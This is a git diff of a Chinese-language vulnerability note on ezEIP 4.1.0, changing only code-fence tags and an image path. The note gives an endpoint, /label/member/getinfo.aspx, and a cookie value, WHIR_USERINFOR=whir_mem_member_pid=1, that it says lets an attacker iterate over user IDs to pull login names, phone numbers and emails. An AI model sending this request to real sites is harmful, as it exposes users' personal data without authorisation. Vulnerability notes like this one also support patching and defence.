@@ -20,14 +20,14 @@ ezEIP 4.1.0
 
 漏洞Url为
 
-```plain
+```
 /label/member/getinfo.aspx
 ```
 
 访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息）
 
-```plain
+```
 WHIR_USERINFOR=whir_mem_member_pid=1;
 ```
 
-![](images/202202162312106.png)
+![](../.gitbook/assets/202202162312106.png)
